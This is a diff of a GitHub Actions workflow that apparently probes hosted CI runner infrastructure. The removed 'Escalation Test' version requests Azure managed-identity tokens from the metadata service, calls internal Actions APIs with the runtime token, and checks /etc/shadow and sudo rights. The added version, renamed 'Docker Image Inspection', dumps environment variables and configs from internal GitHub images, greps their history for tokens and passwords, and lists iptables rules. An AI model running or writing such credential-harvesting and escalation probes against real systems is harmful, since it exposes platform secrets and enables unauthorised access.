@@ -1,61 +1,56 @@
-name: Escalation Test
+name: Docker Image Inspection
 
 on:
   workflow_dispatch:
 
 jobs:
-  escalate:
+  inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure Identity Token
+      - name: Inspect Internal Docker Images
         run: |
-          echo "=== Azure Managed Identity Token ==="
-          curl -s --connect-timeout 5 -H "Metadata: true" \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
+          echo "=== gh-aw-firewall agent ==="
+          docker inspect ghcr.io/github/gh-aw-firewall/agent:latest 2>&1 | head -100
           echo ""
-          echo "=== Azure Identity Info ==="
-          curl -s --connect-timeout 5 -H "Metadata: true" \
-            "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1
+          echo "=== gh-aw-firewall agent env vars ==="
+          docker inspect --format="{{json .Config.Env}}" ghcr.io/github/gh-aw-firewall/agent:latest 2>&1
           echo ""
-          echo "=== Azure Attested Data ==="
-          curl -s --connect-timeout 5 -H "Metadata: true" \
-            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1 | head -5
+          echo "=== gh-aw-firewall agent entrypoint ==="
+          docker inspect --format="{{json .Config.Entrypoint}} {{json .Config.Cmd}}" ghcr.io/github/gh-aw-firewall/agent:latest 2>&1
           echo ""
-          echo "=== Azure Scheduledevents ==="
-          curl -s --connect-timeout 5 -H "Metadata: true" \
-            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
+          echo "=== api-proxy env ==="
+          docker inspect --format="{{json .Config.Env}}" ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>&1
           echo ""
-          echo "=== Docker Info ==="
-          curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | head -30
+          echo "=== api-proxy entrypoint ==="
+          docker inspect --format="{{json .Config.Entrypoint}} {{json .Config.Cmd}}" ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>&1
           echo ""
-          echo "=== Docker Images ==="
-          curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>&1 | head -20
+          echo "=== squid env ==="
+          docker inspect --format="{{json .Config.Env}}" ghcr.io/github/gh-aw-firewall/squid:latest 2>&1
           echo ""
-          echo "=== Hosted Compute RO API ==="
-          curl -s --connect-timeout 5 \
-            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1" 2>&1 | head -10
+          echo "=== github-mcp-server env ==="
+          docker inspect --format="{{json .Config.Env}}" ghcr.io/github/github-mcp-server:latest 2>&1
           echo ""
-          echo "=== ACTIONS_RUNTIME_TOKEN ==="
-          echo "Token exists: $(test -n \"$ACTIONS_RUNTIME_TOKEN\" && echo YES || echo NO)"
-          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
-            echo "Token prefix: ${ACTIONS_RUNTIME_TOKEN:0:20}..."
-            echo "=== Actions Internal API ==="
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              "${ACTIONS_RUNTIME_URL}_apis/pipelines" 2>&1 | head -20
-            echo "=== Actions Artifacts API ==="
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              "${ACTIONS_RUNTIME_URL}_apis/pipelines/1/runs?api-version=6.0-preview" 2>&1 | head -20
-          fi
+          echo "=== gh-aw-mcpg env ==="
+          docker inspect --format="{{json .Config.Env}}" ghcr.io/github/gh-aw-mcpg:latest 2>&1
           echo ""
-          echo "=== ACTIONS_CACHE_URL ==="
-          echo "Cache URL: $ACTIONS_CACHE_URL"
-          echo "Results URL: $ACTIONS_RESULTS_URL"
+          echo "=== List files in firewall agent ==="
+          docker run --rm --entrypoint ls ghcr.io/github/gh-aw-firewall/agent:latest -la / 2>&1 | head -30
           echo ""
-          echo "=== Wireserver ==="
-          curl -s --connect-timeout 3 http://168.63.129.16/machine?comp=goalstate 2>&1 | head -20
+          echo "=== List config in api-proxy ==="
+          docker run --rm --entrypoint ls ghcr.io/github/gh-aw-firewall/api-proxy:latest -la / 2>&1 | head -30
           echo ""
-          echo "=== Check /etc/shadow readable ==="
-          ls -la /etc/shadow 2>&1
-          echo "=== Sudo access ==="
-          sudo -l 2>&1 | head -10
+          echo "=== Squid config ==="
+          docker run --rm --entrypoint cat ghcr.io/github/gh-aw-firewall/squid:latest /etc/squid/squid.conf 2>&1 | head -50
+          echo ""
+          echo "=== Check for hardcoded tokens in images ==="
+          for img in ghcr.io/github/gh-aw-firewall/agent ghcr.io/github/gh-aw-firewall/api-proxy ghcr.io/github/gh-aw-mcpg; do
+            echo "--- $img ---"
+            docker history --no-trunc "$img:latest" 2>&1 | grep -iE "token|secret|key|password|api_key|credential" | head -5
+          done
+          echo ""
+          echo "=== Docker network info ==="
+          docker network ls 2>&1
+          echo ""
+          echo "=== iptables rules ==="
+          sudo iptables -L -n 2>&1 | head -30
           echo "=== Complete ==="
